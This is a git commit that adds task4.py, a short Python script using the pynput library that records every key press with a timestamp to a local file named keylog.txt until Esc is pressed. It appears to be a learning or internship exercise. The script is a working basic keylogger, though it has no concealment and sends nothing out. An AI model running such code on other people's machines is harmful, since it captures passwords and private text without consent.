4baa69551cd18120fc6ff10a682e4edeb80f59ac
sarthak43office <patelsarthak212@gmail.com>
2024-08-18 17:06:37 +0530

    Add files via upload

---
+++ task4.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+import logging
+
+# Set up logging to record keystrokes
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info('Key pressed: {0}'.format(key.char))
+    except AttributeError:
+        logging.info('Special key pressed: {0}'.format(key))
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
